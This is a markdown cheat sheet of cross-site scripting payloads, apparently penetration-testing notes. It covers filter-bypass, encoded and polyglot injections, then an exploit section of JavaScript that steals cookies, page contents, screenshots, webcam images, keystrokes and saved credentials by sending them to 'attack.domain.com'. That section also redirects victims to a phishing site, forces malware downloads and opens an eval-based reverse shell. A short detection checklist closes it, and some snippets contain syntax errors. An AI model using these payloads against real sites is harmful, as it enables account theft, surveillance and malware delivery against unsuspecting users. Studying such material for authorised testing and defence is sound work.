Cross Site Scripting {XSS}
==========================

# Identification Payloads

+ An exhaustive list of XSS test payloads can be found under `~/scripts/xss_complete.txt`   

## Basic Payloads

`<script SRC=http://attacker.domain.com/payload.js></script>`

`<img SRC="javascript:alert('XSS');">`

`<iframe src="javascript:alert(`xss`)">`

`<body oninput=javascript:alert(1)><input autofocus>`

## Filter Bypass Payloads

### No Quotes && Semicolon

`<IMG SRC=javascript:alert('XSS')>`

### Case Filtering

`<IMG SRC=JaVaScRiPt:alert('XSS')>`

### HTML Entities

`<IMG SRC=javascript:alert(&quot;XSS&quot;)>`

### Grave Accent Obfuscation

+ Hide double and single quotes from filter with grave accent wrapping
```
<IMG SRC=`javascript:alert("Hello, 'XSS'")`>
```

### Malformed Link Tags `<a>`

```
\<a onmouseover="alert(document.cookie)"\>attacker.domain.com/payload.js\</a\>
```

#### Chrome Edgecase

```
\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
```

### Malformed `<img>` tags

`<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>`


## Encoded Payloads


### JS alert encode

```
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
```

### HTML Decimal Character Refrences

```
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
```

```
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
```

### HTML Hexidecimal Character Refrences

```
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
```


## Polyglots

```
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

```
jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3ciframe/<iframe/oNloAd=alert()//>\x3e
```

# Exploit Payloads

+ Malicious js code for exploit payloads

## Phishing Redirect

```
window.location='https://attackersphishingsite.com'
```

## Grab Auth Cookie

~ Requires attack server

```
fetch('attack.domain.com?cookie=${encodeURIComponent(document.cookie)}')
```

## Grab Protected Pages

~ Requires attack server

```
fetch('/protected_page')
	.then(page => page.text())
	.then(text => 
		fetch('attack.domain.com', {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({page:text})
		})
	)
```

## Grab Specific Page Data

### Page Area {div, span, etc}

```
fetch('attacker.domain.com?data=' + encodeURIComponent(document.querySelector('.hmtlClassElmentToSteal').textContent))
```

### Input Field/Text Area

```
fetch('attacker.domain.com?data=' + encodeURIComponent(document.querySelector('.hmtlClassElmentToSteal').textValue))
```

## Grab Screenshots

```
<script src=https://html2canvas.hertzen.com/dist/html2canvas.min.js>
html2canvas(document.body)
	.then(canvas => 
			fetch('attack.domain.com', {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' }
					body: JSON.stringify({img: canvas.toDataURL()})
			})
		)
</script>
```

## Forced Download

### Macro Document

```
frame = document.createElement('iframe')
frame.src = 'attack.domain.com/payloadDocument.docx'
document.body.appendChild(frame)
```

### Executable File

```
<a href=/executable.exe download=executable.exe onclick="if(window.el){return;}el=this;
	fetch('attack.domain.com/payload.exe')
		.then(resp => resp.blob())
		.then(blob => 
			{
				el.href=window.URL.createObjectURL(blob); el.click()
			});
			
			return false">
			Social Engineering TXT here
</a>
```


## Capture Data From Webcam

~ Requires attack server
```
vid_element = document.createElement('video')
navigator.mediaDevices.getUserMedia({video:true})
	.then(stream => {
		vid_element.srcObject = stream
		vid_element.play()
		setTimeout(()) => {
			canvas = document.createElement('canvas')
			canvas.width = vid_element.videoWidth
			canvas.height = vid_element.videoHeight
			canvas.getContext('2d').drawImage(vid_element,0,0)

			fetch('attack.domain.com', {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: JSON.stringify({img: canvas.toDataURL()})
				})
		}, 2000)
	})
```

## Reverse Shell

~ Requires attack server/listner

```
sock = new WebSocket('wss://attack.domain.com')
sock.onmessage = event => eval(e.data)
```

## Inject Beef Hook

## Run Keylogger

```
document.addEventListener('change', element => {
		if(!element.target.matches('input, textarea')) return
		fetch('attack.domain.com', {
				method: 'POST',
				headers: { 'Content-Type:' 'application/json' },
				body: JSON.stringify({key: element.target.value})
			})
	})
```

## Steal Saved Browser Credentails

```
form = document.createElement('form')
usr_name = document.createElement('input')
usr_name.setAttribute('type', 'text')
usr_name.setAttribute('name', 'username')

password = document.createElement('input')
password.setAttribute('type', 'password')
password.setAttribute('name', 'password')

form.appendChild(usr_name)
form.appendChild(password)
document.body.appendChild(form)
document.addEventListner('click', () =>
	fetch(`attack.domain.com?usr=${usr_name.value}pass=${password.value}`)
)
```

# Identifying/Detection

## Identification Checklist

### DOM Based XSS

- [ ] Do forms/fields on the web app return user entered data on the page?
- [ ] How does the form/field handle control characters? Does the application error?
- [ ] Are control characters encoded, escaped, filtered, blocked or rendered?
- [ ] Does any kind of filter evasion yeild variations?

### Reflected XSS

- [ ] Are feilds/forms processed by the web application before the response is supplied to the client/frontend?
- [ ] Is the form validated on the front end?
- [ ] Can form validation be bypassed?
- [ ] How does the server respond to control characters supplied to the feild/form?
- [ ] Are control characters encoded, escaped, filtered, blocked or rendered in the return data?
- [ ] Does any kind of filter evasion yeild variations?

### Stored XSS

- [ ] Does user/client controlled field/form data get stored by the server for use in rendering content on the web application?
- [ ] Is the form validated on the front end?
- [ ] Can form validation be bypassed?
- [ ] How does the server respond to control characters supplied to the feild/form?
- [ ] How does the frontend render client data injected with control characters, are they stripped, malformed, encoded or rendered?
- [ ] Does any kind of filter evasion yeild variations?  


# Resources

+ [Portswigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#client-side-template-injection)
+ [OSWAP Cheat-sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
+ [GBHackers Top 500 XSS Cheat sheet](https://gbhackers.com/top-500-important-xss-cheat-sheet/)
+ [Chef Secure](https://www.youtube.com/channel/UCqx-vnWwxXQEJ0TC5a6vuNw)